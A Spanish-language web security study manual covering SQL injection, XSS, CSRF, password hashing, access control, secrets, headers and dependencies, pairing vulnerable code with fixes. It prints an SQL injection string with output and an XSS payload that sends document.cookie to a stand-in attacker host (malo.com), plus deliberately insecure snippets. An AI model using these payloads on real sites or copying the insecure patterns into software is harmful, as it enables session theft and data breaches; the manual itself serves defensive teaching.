Manual de estudio

Ciberseguridad para páginas web

La mayoría de los hackeos no son magia: son las mismas cinco o seis fallas repetidas. Este libro te enseña a reconocerlas y taparlas, con código vulnerable al lado del seguro. Los bloques con ✓ salida real muestran un ataque funcionando de verdad, y cómo la versión segura lo frena.

Para defender, no para atacar

Todo lo de este libro es para asegurar tus propias aplicaciones. Los ejemplos de ataque corren contra una base de juguete local, para que veas por qué la defensa importa. Probar estas técnicas contra sistemas ajenos sin permiso es ilegal.

Cómo está armado

  • Parte 1, fundamentos. Pensar como atacante, y por qué HTTPS es la base.
  • Parte 2, las clásicas. Inyección SQL, XSS, CSRF, autenticación y control de acceso. Las que más aparecen.
  • Parte 3, endurecer. Secretos, headers de seguridad y dependencias.
  • Parte 4, a producción. Un checklist y glosario.
Capítulo 1

Pensar como atacante

La seguridad empieza con un cambio de mentalidad: dejar de asumir que la gente usa tu app como vos esperás. Un atacante hace justo lo que no previste, y a propósito.

La superficie de ataque

Es todo punto por donde entra información a tu sistema: formularios, parámetros de la URL, headers, archivos que suben, la API, las cookies. Cada entrada es una puerta. Cuanto más entiendas por dónde entran datos, mejor sabés qué proteger.

Tres principios que sostienen todo

  • Nunca confíes en el cliente. El principio número uno. Todo lo que llega del navegador puede estar manipulado: el usuario puede editar el HTML, la URL, la request. Validá todo del lado del servidor, siempre. La validación en el frontend es comodidad, no seguridad.
  • Mínimo privilegio. Cada parte del sistema tiene solo los permisos que necesita, nada más. Si el usuario de la base solo lee, no le des permiso de borrar. Así, un agujero hace menos daño.
  • Defensa en profundidad. No dependas de una sola barrera. Varias capas de defensa, para que si una falla, otra aguante.
El OWASP Top 10

OWASP es una organización que publica el "Top 10" de riesgos de seguridad web, la lista de referencia de la industria. Los capítulos de la Parte 2 cubren los que más vas a cruzar. Si te dedicás a esto, leer el OWASP Top 10 completo es tarea obligada.

Capítulo 2

HTTPS: la base de todo

Antes de cualquier otra defensa, está HTTPS. Sin él, todo lo demás no importa, porque los datos viajan en texto plano y cualquiera en el camino los lee.

Qué resuelve

HTTP manda todo sin cifrar. En una red wifi compartida, alguien puede leer tus contraseñas, tokens y datos mientras viajan. HTTPS agrega TLS, que cifra la conexión entre el navegador y el servidor. Da tres garantías:

  • Cifrado: nadie en el medio puede leer lo que viaja.
  • Integridad: nadie puede modificar los datos en tránsito sin que se note.
  • Autenticidad: el certificado prueba que hablás con el servidor real y no con un impostor.

En la práctica

Hoy HTTPS es gratis y automático. Let's Encrypt da certificados sin costo, y la mayoría de los proveedores (los del librito de Docker) lo configuran solos. No hay excusa para HTTP en producción.

Forzá HTTPS

No alcanza con soportar HTTPS: hay que redirigir todo HTTP a HTTPS, y usar el header Strict-Transport-Security (lo vemos en el capítulo de headers) para que el navegador nunca intente la versión insegura. Y las cookies sensibles van con el flag Secure, para que solo viajen por HTTPS.

Capítulo 3

Inyección SQL

La vulnerabilidad más famosa y todavía una de las más comunes. Pasa cuando pegás texto del usuario dentro de una consulta SQL, y ese texto termina ejecutándose como código.

El ataque, funcionando

Un login que arma la query concatenando el nombre de usuario. El atacante no manda un nombre: manda un pedazo de SQL. Esto corrió de verdad:

inyección real✓ salida real
### Entrada del atacante: "' OR '1'='1"

VULNERABLE (concatenando):
  SQL armado: SELECT id, usuario FROM usuarios WHERE usuario = '' OR '1'='1'
  resultado: [(1, 'carlos'), (2, 'ana'), (3, 'admin')]
  -> devolvió TODA la tabla. El atacante entró sin usuario válido.

SEGURO (parametrizado):
  resultado: []
  -> vacío. El ataque se trató como un nombre de usuario literal.

Mirá el SQL armado: el ' OR '1'='1 cierra la comilla y agrega una condición siempre verdadera. La query devuelve todo. Con variantes de esto se roban tablas enteras, se saltean logins, o se borra la base.

El código

mal vs bien
# MAL: el texto del usuario se vuelve parte del SQL
q = "SELECT * FROM usuarios WHERE usuario = '" + usuario + "'"
cur.execute(q)

# BIEN: parámetro. El motor lo trata como dato, nunca como código
cur.execute("SELECT * FROM usuarios WHERE usuario = ?", (usuario,))
La defensa, en una frase

Nunca construyas SQL pegando texto. Usá siempre consultas parametrizadas (? o $1). El motor se encarga de que el dato jamás se ejecute como código. Un ORM (del librito de SQL) hace esto por vos por defecto.

Capítulo 4

XSS: inyección en el navegador

Cross-Site Scripting es la prima de la inyección SQL, pero del lado del navegador. Pasa cuando mostrás texto del usuario en tu página sin limpiarlo, y ese texto incluye código JavaScript que se ejecuta en la máquina de otros visitantes.

Cómo funciona

Imaginá un campo de comentarios. Un atacante deja este "comentario":

el comentario malicioso
<script>fetch('https://malo.com/robar?c=' + document.cookie)</script>

Si tu página inserta ese texto tal cual en el HTML, cada persona que vea el comentario ejecuta ese script, y su cookie de sesión se va al servidor del atacante. Con esa cookie, el atacante se hace pasar por la víctima.

La defensa: escapar la salida

Escapar significa convertir los caracteres especiales del HTML en texto inofensivo: < se vuelve &lt;, así el navegador lo muestra como texto y no lo ejecuta.

mal vs bien
// MAL: inserta HTML crudo, el script se ejecuta
elemento.innerHTML = comentario;

// BIEN: inserta como texto, nunca se ejecuta
elemento.textContent = comentario;

La buena noticia: los frameworks modernos (React, Vue, Angular) escapan la salida por defecto. Mientras no fuerces la inserción de HTML crudo (el dangerouslySetInnerHTML de React deja ver el peligro en el nombre), estás cubierto.

Escapá según el contexto

El escape correcto depende de dónde va el dato: dentro de HTML, de un atributo, de una URL o de JavaScript, cada uno tiene sus reglas. Por eso conviene apoyarse en el framework y en librerías probadas en vez de escapar a mano. Y como capa extra, el header Content-Security-Policy (capítulo de headers) limita qué scripts puede correr la página.

Capítulo 5

CSRF: acciones que no pediste

Cross-Site Request Forgery engaña a tu navegador para que haga una acción en un sitio donde ya estás logueado, sin que vos quieras. Aprovecha que el navegador manda tus cookies automáticamente.

El escenario

Estás logueado en tu banco en una pestaña. En otra, abrís una página maliciosa que tiene escondido un formulario que se envía solo a tubanco.com/transferir. Como tu navegador manda la cookie de sesión del banco en toda request a ese dominio, la transferencia se ejecuta con tu sesión. Vos nunca la pediste.

La defensa: el token CSRF

La idea: exigir en cada acción sensible un valor secreto que solo tu propio sitio conoce y que el atacante no puede adivinar. El servidor genera un token único por sesión, lo pone en tus formularios, y rechaza cualquier request que no lo traiga.

el token en el formulario
<form method="POST" action="/transferir">
  <input type="hidden" name="csrf_token" value="a8f3...token único">
  ...
</form>
# el servidor verifica que el token coincida con el de tu sesión.
# la página del atacante no puede conocerlo, así que su request falla.
En la práctica

Casi todos los frameworks traen protección CSRF incorporada, a veces activada por defecto. Además, marcar las cookies con SameSite=Lax o Strict hace que no se manden en requests que vienen de otros sitios, lo que corta la raíz del ataque. Las APIs que usan tokens en el header (no cookies) son inmunes por diseño.

Capítulo 6

Autenticación: guardar contraseñas bien

Si tu base se filtra (pasa seguido), lo que decide si es una catástrofe o un susto es cómo guardaste las contraseñas. La regla es absoluta: nunca en texto plano.

Hashing con sal

No guardás la contraseña, guardás un hash: el resultado de pasarla por una función de un solo sentido, imposible de revertir. Cuando el usuario entra, hasheás lo que escribió y comparás los hashes. La contraseña real nunca se guarda.

La sal es un valor aleatorio único por usuario que se agrega antes de hashear. Hace que dos personas con la misma contraseña tengan hashes distintos, y arruina las "rainbow tables" (tablas precalculadas de hashes comunes). Esto corrió de verdad, con bcrypt:

bcrypt✓ salida real
misma contraseña, hash 1: $2b$12$jpH0nHw9o89vHklwAybIY.29yDg5C0YL214Zp4jaQOyMf ...
misma contraseña, hash 2: $2b$12$6xkVRP91D3bxPxrqA5RHgOcLZmlSLhwPOQhkTRXcdxMIh ...
-> distintos, por la sal aleatoria. Eso frena las 'rainbow tables'.

verificar login correcto: True
verificar login incorrecto: False
el código
import bcrypt
# al registrarse: hashear y guardar el hash
hash = bcrypt.hashpw(password, bcrypt.gensalt())
# al loguearse: verificar
bcrypt.checkpw(password_ingresada, hash)   # True o False
Usá el algoritmo correcto

No uses md5 ni sha1 para contraseñas: son rápidos, y eso los hace fáciles de atacar por fuerza bruta. Usá algoritmos hechos para esto, lentos a propósito: bcrypt, argon2 o scrypt. Y nunca inventes tu propio esquema de hashing.

Otras defensas de login

  • Limitá los intentos de login (rate limiting) para frenar la fuerza bruta.
  • Ofrecé segundo factor (2FA) para las cuentas importantes.
  • Exigí contraseñas razonables, y chequealas contra listas de las más filtradas.
Capítulo 7

Control de acceso roto

Saber quién sos (autenticación) es una cosa. Chequear qué podés hacer (autorización) es otra, y es la que más se olvida. El resultado son usuarios que acceden a datos que no son suyos.

IDOR: el ID que se cambia a mano

El caso clásico. Tu app muestra la factura en /facturas/42. El usuario cambia la URL a /facturas/43 y ve la factura de otro, porque el servidor devolvió la factura sin chequear que sea suya. Se llama Insecure Direct Object Reference.

mal vs bien
# MAL: devuelve la factura sin verificar de quién es
@app.get("/facturas/{id}")
def factura(id):
    return db.facturas.get(id)

# BIEN: verifica que la factura sea del usuario logueado
@app.get("/facturas/{id}")
def factura(id, usuario=usuario_actual()):
    f = db.facturas.get(id)
    if f.usuario_id != usuario.id:
        raise HTTPException(403)      # prohibido
    return f

La regla

En cada acción sobre un recurso, verificá dos cosas: que el usuario esté logueado (autenticación) y que tenga permiso sobre ese recurso puntual (autorización). No alcanza con esconder el botón en el frontend: el atacante le pega directo a la API. El chequeo va en el servidor, en cada endpoint.

Negá por defecto

Diseñá el acceso al revés: todo prohibido, y vas habilitando lo permitido. Así, si te olvidás de proteger un endpoint nuevo, queda cerrado por defecto, no abierto. El error tiene que ser hacia la seguridad.

Capítulo 8

Manejar secretos

Claves de API, tokens, contraseñas de bases: los secretos filtrados son una de las causas más comunes de incidentes, y casi siempre por el mismo error tonto.

El error: secretos en el código

nunca hagas esto
STRIPE_KEY = "sk_live_51H8xY2..."   # MAL: hardcodeado en el código

En cuanto eso entra a Git, queda en la historia para siempre, aunque después lo borres. Si el repo es público o se filtra, cualquiera lo tiene. Hay bots que escanean GitHub buscando justo esto, en segundos.

Lo correcto: variables de entorno

bien
import os
STRIPE_KEY = os.environ["STRIPE_KEY"]   # viene del entorno, no del código

El secreto vive fuera del código: en un archivo .env local (que va en el .gitignore, del librito de Git), y en producción, en el gestor de secretos del proveedor o en los secrets de tu pipeline (del librito de CI/CD).

Si se filtró, rotalo

La primera acción ante un secreto filtrado no es borrarlo del código: es rotarlo, o sea generar uno nuevo e invalidar el viejo. Mientras el viejo siga activo, no importa que lo hayas borrado del repo, alguien ya lo puede tener.

Capítulo 9

Headers de seguridad y CORS

Unos pocos headers HTTP en las respuestas de tu servidor le dan instrucciones de seguridad al navegador. Son fáciles de agregar y suben mucho la defensa.

Los headers que importan

HeaderQué hace
Strict-Transport-SecurityObliga al navegador a usar siempre HTTPS con tu sitio.
Content-Security-PolicyLimita de dónde puede cargar scripts, estilos e imágenes. Tu mejor defensa extra contra XSS.
X-Content-Type-Options: nosniffEvita que el navegador "adivine" el tipo de un archivo y lo ejecute mal.
X-Frame-OptionsImpide que tu sitio se cargue dentro de un iframe ajeno (ataques de clickjacking).

Hay librerías que los ponen todos con una línea, como helmet en Express. No hay razón para no usarlas.

CORS: quién puede llamar a tu API

Por seguridad, el navegador bloquea que una página de un dominio llame por JavaScript a una API de otro dominio, salvo que la API lo permita explícitamente. Eso es CORS. Vos configurás qué orígenes pueden consumir tu API:

CORS en FastAPI
from fastapi.middleware.cors import CORSMiddleware
app.add_middleware(CORSMiddleware,
    allow_origins=["https://miapp.com"],   # solo tu frontend
    allow_methods=["*"])
No abras CORS a todos

Ver allow_origins=["*"] en producción es una señal de alarma. Permitir cualquier origen deja que cualquier sitio consuma tu API desde el navegador de tus usuarios. Listá solo los dominios que de verdad la necesitan.

Capítulo 10

El riesgo que no escribiste vos

Tu app usa decenas o cientos de librerías de terceros. Cada una es código que corre en tu servidor y que vos no revisaste. Una vulnerabilidad en cualquiera de ellas es una vulnerabilidad tuya.

Escaneá tus dependencias

Las herramientas de tu ecosistema revisan tus dependencias contra bases de vulnerabilidades conocidas, y te dicen qué actualizar:

shell
npm audit          # Node: lista vulnerabilidades conocidas
npm audit fix      # actualiza lo que puede automáticamente

pip-audit          # Python: lo mismo para pip

Corré esto seguido, e idealmente en tu pipeline de CI (del librito de CI/CD), para que cada push avise si entró una dependencia vulnerable. GitHub también lo hace solo con Dependabot, que hasta te abre los PRs de actualización.

Buenas costumbres con dependencias

  • Fijá las versiones (con el lockfile) para builds reproducibles.
  • Actualizá seguido y de a poco, en vez de saltos gigantes cada dos años.
  • Antes de sumar una librería, mirá si está mantenida y cuánto pesa. Cada dependencia es superficie de ataque.
  • Desconfiá de paquetes con nombres parecidos a los populares: es una técnica de ataque (typosquatting).
Cierre

Checklist y glosario

Checklist de seguridad web

  • HTTPS forzado en todo el sitio, con HSTS.
  • Toda entrada validada del lado del servidor. Nunca confiar en el cliente.
  • Consultas SQL siempre parametrizadas.
  • Salida escapada para evitar XSS (o framework que lo haga).
  • Protección CSRF activa, cookies con SameSite.
  • Contraseñas con bcrypt / argon2 y sal. Nunca en texto plano.
  • Autorización chequeada en cada endpoint, no solo autenticación.
  • Secretos en variables de entorno, jamás en el código.
  • Headers de seguridad puestos (helmet o equivalente).
  • CORS restringido a los orígenes necesarios.
  • Dependencias escaneadas y actualizadas.
  • Rate limiting en login y endpoints sensibles.

Lo que te llevás

Sabés reconocer y tapar las fallas más comunes: inyección, XSS, CSRF, contraseñas mal guardadas, control de acceso flojo, secretos filtrados. La seguridad no se termina nunca, pero cubrir estas ya te pone por delante de la mayoría. Aplicá el checklist en tu próximo proyecto de entrada, no al final.
